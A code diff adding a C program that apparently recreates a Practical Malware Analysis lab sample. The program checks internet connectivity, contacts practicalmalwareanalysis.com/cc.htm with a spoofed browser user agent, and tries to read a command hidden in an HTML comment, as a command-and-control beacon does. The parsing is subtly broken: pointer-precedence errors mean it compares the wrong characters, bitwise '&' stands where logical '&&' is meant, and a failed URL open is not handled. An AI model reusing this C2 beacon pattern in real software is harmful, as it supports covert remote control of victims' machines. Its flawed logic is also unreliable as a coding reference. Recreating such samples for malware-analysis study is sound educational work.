@@ -1,0 +1,55 @@
+#include <stdio.h>
+#include <Windows.h>
+#include <wininet.h>
+#include <tchar.h>
+#define LIMIT 1024
+#pragma comment(lib, "wininet")
+
+
+
+
+int main(int argc, CHAR* argv[]) {
+	//Check internet connection using InternetGetConnectionState API
+	DWORD InternetConnection = 2;
+	HANDLE HInternet;
+	HANDLE HUrl;
+	LPVOID Buffer = malloc(LIMIT);
+	LPVOID Buffer1 = malloc(LIMIT);
+	DWORD DWByteReaded;
+	if (InternetGetConnectedState(&InternetConnection, 0)) {
+		printf("Success: Internet Connection\n");
+	}
+	else {
+		printf("Error 1.1: No Internet\n");
+		exit(EXIT_FAILURE);
+	}
+	HInternet = InternetOpen(_T("Internet Explorer 7.5/pma"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	if (HInternet == NULL) {
+		printf("Failure to ininitate Internet connection!\n");
+		exit(EXIT_FAILURE);
+	}
+	HUrl = InternetOpenUrl(HInternet, _T("http://www.practicalmalwareanalysis.com/cc.htm"), NULL, 0, 0, 0);
+	if (HUrl == NULL) {
+		printf("Could not open URL http://www.practicalmalwareanalysis.com/cc.htm\n");
+		InternetCloseHandle(HInternet);
+		//exit(EXIT_FAILURE);
+	}
+	if (!InternetReadFile(HUrl, Buffer, LIMIT, &DWByteReaded)) {
+		printf("Could not read file! Error Code: %d\n", GetLastError());
+		InternetCloseHandle(HInternet);
+		InternetCloseHandle(HUrl);
+		exit(EXIT_FAILURE);
+	}
+	if (((*(LPTSTR)Buffer) == '<') & ((*(LPTSTR) Buffer+1) == '!') & ((*(LPTSTR) Buffer+2) == '-') & ((*(LPTSTR)Buffer+3) == '-')) {
+		LPTSTR LPCommand = (LPTSTR)Buffer + 4;
+	}
+	else {
+		printf("Failure to get command\n");
+		InternetCloseHandle(HInternet);
+		InternetCloseHandle(HUrl);
+		exit(EXIT_FAILURE);
+	}
+	InternetCloseHandle(HInternet);
+	InternetCloseHandle(HUrl);
+	return 0;
+}
